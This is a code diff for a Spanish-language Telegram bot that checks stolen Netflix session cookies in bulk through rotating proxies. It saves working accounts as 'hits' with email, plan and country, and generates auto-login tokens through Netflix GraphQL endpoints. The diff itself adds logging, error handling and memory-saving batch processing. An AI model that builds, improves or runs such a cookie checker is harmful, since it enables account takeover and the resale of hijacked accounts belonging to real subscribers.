@@ -11,7 +11,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import logging
-from logging.handlers import RotatingFileHandler
+from logging.handlers import RotatingFileHandler, TimedRotatingFileHandler
 import random
 
 # Configuración básica
@@ -24,7 +24,7 @@ if not BOT_TOKEN:
     raise ValueError("Falta la variable de entorno TELEGRAM_TOKEN en Render")
 
 DEVELOPER = "@Molina"
-VERSION = "3.1.0-ANTIBOT-REAL"
+VERSION = "3.2.0-MEMORY-LOG-OPTIMIZED"
 
 # 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
@@ -32,8 +32,26 @@ ADMIN_IDS = [8917082484]
 os.makedirs("logs", exist_ok=True)
 os.makedirs("hits", exist_ok=True)
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1204, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
+# 📝 REGISTRO MEJORADO CON ROTACIÓN POR TIEMPO Y TAMAÑO
 logger = logging.getLogger(__name__)
+logger.setLevel(logging.INFO)
+
+# 1. Handler para consola
+console_handler = logging.StreamHandler()
+console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+logger.addHandler(console_handler)
+
+# 2. Handler para archivo con rotación por tamaño (10MB) y backup
+file_handler = RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8')
+file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+logger.addHandler(file_handler)
+
+# 3. Handler para logs de hits específicos (rotación diaria)
+hit_logger = logging.getLogger('hit_logger')
+hit_logger.setLevel(logging.INFO)
+hit_log_handler = TimedRotatingFileHandler("logs/hits.log", when="midnight", backupCount=30, encoding='utf-8')
+hit_log_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
+hit_logger.addHandler(hit_log_handler)
 
 # 🛡️ Palabras bloqueadas (SPAM)
 SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'bonus', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
@@ -151,7 +169,8 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
             token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
             tok = token_data.get("token")
             if tok: return str(tok)
-    except: pass
+    except Exception as e:
+        logger.debug(f"iOS Token Error: {e}")
 
     # Método 2: GraphQL Android (Fallback)
     try:
@@ -171,7 +190,9 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
             d = r2.json()
             tok = (d.get("data") or {}).get("createAutoLoginToken")
             if tok: return str(tok)
-    except: pass
+    except Exception as e:
+        logger.debug(f"Android Token Error: {e}")
+        
     return None
 
 def check_account(cookies: dict, proxy=None, timeout=20):
@@ -334,7 +355,9 @@ class NetflixChecker:
         self._proxy_index = 0
         self.lock = threading.Lock()
         self.stats = {"total":0,"checked":0,"hits":0,"bad":0,"errors":0,"start":time.time()}
+        # Memoria Optimizada: Límite de hits en memoria para evitar saturación
         self.hits = []
+        self.MAX_HITS_IN_MEMORY = 1000 
 
     def _next_proxy(self):
         if not self._proxy_list: return None
@@ -346,10 +369,13 @@ class NetflixChecker:
 
     def process_cookie(self, cookie_text):
         cookies = load_cookies(cookie_text)
-        try: result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
-        except:
+        try: 
+            result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
+        except Exception as e:
+            logger.error(f"Error procesando cookie: {e}", exc_info=True)
             with self.lock: self.stats["errors"]+=1; self.stats["checked"]+=1
             return None
+            
         with self.lock:
             self.stats["checked"]+=1
             if result:
@@ -357,22 +383,40 @@ class NetflixChecker:
                 result["cookie_raw"] = cookie_text.strip()
                 self.hits.append(result)
                 self._save_hit(result, cookie_text)
+                
+                # Limpiar memoria si excede el límite
+                if len(self.hits) > self.MAX_HITS_IN_MEMORY:
+                    self.hits = self.hits[-self.MAX_HITS_IN_MEMORY:]
+                    
                 return result
-            else: self.stats["bad"]+=1; return None
+            else: 
+                self.stats["bad"]+=1
+                return None
 
-    def process_batch(self, cookies_list):
+    def process_batch_generator(self, cookies_list):
+        """Generador para procesamiento por lotes eficiente en memoria"""
         self.stats["total"], self.stats["start"] = len(cookies_list), time.time()
-        results = []
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = [executor.submit(self.process_cookie, c) for c in cookies_list if c.strip()]
+            futures = {executor.submit(self.process_cookie, c): c for c in cookies_list if c.strip()}
             for future in as_completed(futures):
                 try:
                     result = future.result()
-                    if result: results.append(result)
-                except: pass
+                    if result:
+                        yield result
+                except Exception as e:
+                    logger.error(f"Error en procesamiento por lotes: {e}", exc_info=True)
+
+    def process_batch(self, cookies_list):
+        """Método original para mantener compatibilidad, pero usa el generador internamente"""
+        results = []
+        for result in self.process_batch_generator(cookies_list):
+            results.append(result)
         return results
 
     def _save_hit(self, acc, raw_cookie):
+        # Log estructurado de hit
+        hit_logger.info(f"HIT | Email: {acc['email']} | Plan: {acc['plan']} | País: {acc['country']}")
+        
         safe_email = re.sub(r'[\\/:*?"<>|]', "_", acc["email"])
         fname = f"[{acc['country_code']}] [{safe_email}] - {acc['plan']}.txt"
         path = os.path.join("hits", fname)
@@ -474,7 +518,8 @@ class NetflixCheckerBot:
                     for h in hits:
                         logs_text += f"• {h.strip()[-80:]}\n"
             await update.message.reply_text(logs_text + f"\n👨‍💻 {DEVELOPER}" if logs_text != "" else "Nenhum log ainda.", parse_mode="HTML")
-        except:
+        except Exception as e:
+            logger.error(f"Error leyendo logs: {e}")
             await update.message.reply_text("❌ Erro ao ler logs.")
 
     async def done_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -482,7 +527,10 @@ class NetflixCheckerBot:
         if user_id in self.user_sessions and self.user_sessions[user_id]:
             cookies_list = self.user_sessions[user_id]
             await update.message.reply_text(f"🔄 Processando {len(cookies_list)} cookies...")
-            results = self.checker.process_batch(cookies_list)
+            
+            # Usar el generador para eficiencia de memoria
+            results = list(self.checker.process_batch_generator(cookies_list))
+            
             if results:
                 await update.message.reply_text(f"✅ {len(results)} HITS!")
                 for acc in results:
@@ -578,7 +626,7 @@ class NetflixCheckerBot:
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
     def run(self):
-        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS - ANTI-BOT REAL")
+        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS - ANTI-BOT REAL - MEMORIA OPTIMIZADA")
         self.app.run_polling()
 
 if __name__ == "__main__":
